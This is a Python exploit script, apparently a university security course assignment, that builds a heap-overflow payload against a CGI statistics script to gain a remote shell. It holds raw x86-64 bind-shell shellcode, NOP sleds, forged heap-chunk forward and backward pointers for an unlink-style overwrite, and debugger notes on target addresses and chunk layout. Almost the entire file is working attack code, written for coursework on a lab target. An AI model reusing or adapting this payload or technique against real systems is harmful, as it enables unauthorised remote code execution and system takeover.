#!/usr/bin/env python3

# Garrett Gregory & Alexander Heye
# CSCI 461
# Assignment 4

# Opens up a shell on the target machine by exploiting a heap overflow
# vulnerability and running some shell commands.

import os
import requests
from bs4 import BeautifulSoup
import sys


opcode = "3"

# Jump 8
# NOP 8
# Exploit Code
# NOPs
# deadbeef
# NOPs?
# pointer to beginning of buffer

# 10  Bytes
jmp_8 = ("\x90" * 32) + "\xeb\x24\xeb\x24" + "\x90" * 28
# 150 bytes
shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48" \
            "\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01" \
            "\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49" \
            "\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6" \
            "\x04\x24\x02\x66\xc7\x44\x24\x02\x4d\x24" \
            "\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a" \
            "\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e" \
            "\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31" \
            "\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f" \
            "\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49" \
            "\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03" \
            "\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75" \
            "\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf" \
            "\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1" \
            "\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
# 1249 Bytes
# print int(0x558 - 150 - 10)

# 544?
# dist between chunks minus size of shell code plus offset to deadbeef
nops = "\x90" * (544 - 150 - 32 - 32 + 8)
# 4 Bytes
deadbeef = "\xef\xbe\xad\xde"
# 4 Bytes
nops2 = "\x90" * 4
nulls = "\x00\x00\x00\x00"
ptr_chunk = "\x30\x30\x60\x00"
# Address of pointer to displayStats
ptr_ptr_ds = "\xff\x7f\x00\x00\x38\xdd\xff\xff"
# Address of displayStats
# 20
new_bk = "\x28\xdd\xff\xff\xff\x7f\x00\x00"
new_fd = "\x30\x30\x60\x00"
#new_bk = "\x0d\xde\xff\xff\xff\x7f\x00\x00"

exploit_str = jmp_8 + shellcode + nops + \
        deadbeef + nops2 + new_fd + nulls + new_bk + "="

exData = "opcode=" + opcode + "&statsfilename=" + exploit_str

message = "GET /cgi-bin/stats.pl?" + exData

f = open('deleteme', 'w')
f.write(message)
f.close()


# mov 0x10(%rax), %rax
# lea 0x2200(%rax), $rdx so the size of a chunk is roughly 0x2210?

# Heap chunk structure
# ---------------- Beginning of chunk (chunk_addr)
# 8 bytes junk
# ---------------- 0x08(chunk_addr) This is where fd/bk point
# deadbeef flag    8bytes
# ---------------- 0x10(chunk_addr) (16d(chunk_addr))
# forward
# ---------------- 0x18(chunk_addr) (24d(chunk_addr))
# backward
# ----------------


# Potentially useful addresses
# 0x7fffffffdcd8 tested against deadbeef (1)
# 0x7fffffffdce0 or maybe its this one? (4)
# 0x7fffffffe6c8 rbp-20 in nonlinearRegression (address of malloc'd chunk) (2)
# 0x7fffffffdd20 rbp-30 <nonlinearRegression +109> (3)
# 0x7fffffffdded rsi before strcpy, IS address of beginning of string (4)
# 0x603010 rdi before strcpy, location memory being copied to? YES, addr of chunk (5)
# 0x603230 rsi before freeInternalHeapChunk, addr of next chunk (6)
# 0x603230 + 8 location of flag tested against deadbeef


# Distances
# 2544 distance between deadbeef of next and beginning of chunk (2-1)
# 2472 (2-3)
# 2267 (2-4)
# 544 (6-5)

# p/x $rbp-0x8
# x/8xb 0xaddress


# From freeInternalHeapChunk
# Assuming param passed in is address of chunk
# move 0x100 to (rax) (4 bytes)
# move 0x216 to 0x4(%rax) (4 bytes)
# move 0xdeadbeef 0x8(%rax) (8 bytes)
# move -0x10(%rbp) to 0x10(%rax) (8 bytes)
# move some address to 0x18(%rax)
